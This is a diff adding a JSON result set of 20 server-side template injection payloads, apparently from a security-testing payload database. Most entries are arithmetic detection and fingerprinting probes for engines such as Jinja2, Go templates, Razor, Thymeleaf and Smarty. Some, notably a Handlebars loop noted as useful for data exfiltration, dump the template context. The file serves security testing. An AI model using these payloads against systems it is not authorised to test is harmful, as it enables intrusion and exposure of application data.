@@ -1,0 +1,359 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "ssti"
+  },
+  "count": 20,
+  "results": [
+    {
+      "id": "20fa1373fc08a287",
+      "payload": "{{.}}",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Go template — dump current data context. If response shows struct or map contents, Go template engine confirmed.",
+      "source": "ensphere",
+      "tags": [
+        "context",
+        "go",
+        "probe",
+        "template"
+      ]
+    },
+    {
+      "id": "27d09ad61929c98a",
+      "payload": "%7B%7B7*7%7D%7D",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "url",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "URL-encoded {{7*7}}.",
+      "source": "ensphere",
+      "tags": [
+        "detection",
+        "probe",
+        "url_encoded"
+      ]
+    },
+    {
+      "id": "3b90a8f7b26016fc",
+      "payload": "{{7*'7'}}",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "String multiplication probe. Jinja2 returns 7777777. Twig returns 49.",
+      "source": "ensphere",
+      "tags": [
+        "detection",
+        "fingerprint",
+        "probe"
+      ]
+    },
+    {
+      "id": "3bad8e398deb5d51",
+      "payload": "%24%7B7*7%7D",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "url",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "URL-encoded ${7*7}.",
+      "source": "ensphere",
+      "tags": [
+        "detection",
+        "dollar",
+        "probe",
+        "url_encoded"
+      ]
+    },
+    {
+      "id": "5756b7f63ec69d4b",
+      "payload": "${7*7+0}",
+      "technique": "reflected",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Dollar syntax SSTI probe via JSON body.",
+      "source": "ensphere",
+      "tags": [
+        "detection",
+        "dollar",
+        "json",
+        "probe"
+      ]
+    },
+    {
+      "id": "58ce9d1dfda47451",
+      "payload": "${7*7}",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Alternative expression syntax. Works in some engines (Freemarker, Mako).",
+      "source": "ensphere",
+      "tags": [
+        "detection",
+        "dollar",
+        "probe"
+      ]
+    },
+    {
+      "id": "87f20fc963534913",
+      "payload": "{{7*7}}",
+      "technique": "reflected",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "SSTI probe via HTTP header.",
+      "source": "ensphere",
+      "tags": [
+        "detection",
+        "header",
+        "probe"
+      ]
+    },
+    {
+      "id": "8b044069aabb43b8",
+      "payload": "@(7*7)",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Razor — expression evaluation probe. Returns 49 if Razor engine processes input.",
+      "source": "ensphere",
+      "tags": [
+        "dotnet",
+        "probe",
+        "razor"
+      ]
+    },
+    {
+      "id": "8be51b2810a13bf8",
+      "payload": "{{7*7}}",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Universal SSTI probe. If response contains 49, template engine evaluates expressions.",
+      "source": "ensphere",
+      "tags": [
+        "detection",
+        "probe",
+        "universal"
+      ]
+    },
+    {
+      "id": "8e8cf36fbb0a3c63",
+      "payload": "{{7*7}}",
+      "technique": "reflected",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "SSTI probe via JSON body field.",
+      "source": "ensphere",
+      "tags": [
+        "detection",
+        "json",
+        "probe"
+      ]
+    },
+    {
+      "id": "a6376e241c202a59",
+      "payload": "#{7*7}",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Ruby/Pug expression syntax.",
+      "source": "ensphere",
+      "tags": [
+        "detection",
+        "probe",
+        "pug",
+        "ruby"
+      ]
+    },
+    {
+      "id": "c4c28c2e5ed3080f",
+      "payload": "{{7*7}}",
+      "technique": "reflected",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "SSTI probe via form-encoded body field (e.g., name, comment, message).",
+      "source": "ensphere",
+      "tags": [
+        "detection",
+        "form",
+        "probe"
+      ]
+    },
+    {
+      "id": "d021ad419e914b12",
+      "payload": "{{printf \"%v\" .}}",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Go template — verbose format of context via printf. Helps fingerprint Go's text/template or html/template.",
+      "source": "ensphere",
+      "tags": [
+        "go",
+        "printf",
+        "probe",
+        "template"
+      ]
+    },
+    {
+      "id": "d5ac10e4aa461a91",
+      "payload": "\u003c%= 7*7 %\u003e",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "ERB/EJS expression syntax. Returns 49 if ERB-style engine.",
+      "source": "ensphere",
+      "tags": [
+        "detection",
+        "erb",
+        "probe"
+      ]
+    },
+    {
+      "id": "e97cdc5603e9b401",
+      "payload": "{{this}}",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Handlebars — dump current context object. Reveals template variables and data model.",
+      "source": "ensphere",
+      "tags": [
+        "context",
+        "handlebars",
+        "node",
+        "probe"
+      ]
+    },
+    {
+      "id": "351bb83f4cce5d45",
+      "payload": "__${7*7}__::x",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Thymeleaf — expression evaluation via pre-processing syntax. Spring MVC resolves __${}__ before template.",
+      "source": "ensphere",
+      "tags": [
+        "java",
+        "probe",
+        "spring",
+        "thymeleaf"
+      ]
+    },
+    {
+      "id": "49d4ee4f4007d096",
+      "payload": "#{7*7+0}",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Pug/Jade expression evaluation.",
+      "source": "ensphere",
+      "tags": [
+        "node",
+        "probe",
+        "pug"
+      ]
+    },
+    {
+      "id": "661b02f47da4987a",
+      "payload": "#{7*7}",
+      "technique": "expression_eval",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Spring SpEL — arithmetic evaluation probe. Returns 49 if SpEL processes input.",
+      "source": "ensphere",
+      "tags": [
+        "probe",
+        "spel",
+        "spring"
+      ]
+    },
+    {
+      "id": "677ea5ebfabec941",
+      "payload": "{{#each this}}{{@key}}={{this}} {{/each}}",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Handlebars — iterate and dump all key-value pairs in context. Useful for data exfil.",
+      "source": "ensphere",
+      "tags": [
+        "context",
+        "extraction",
+        "handlebars",
+        "node"
+      ]
+    },
+    {
+      "id": "7fd02317c80158e5",
+      "payload": "{math equation=\"7*7\"}",
+      "technique": "reflected",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Smarty — math function evaluation. Returns 49 if Smarty is processing templates.",
+      "source": "ensphere",
+      "tags": [
+        "math",
+        "php",
+        "probe",
+        "smarty"
+      ]
+    }
+  ]
+}
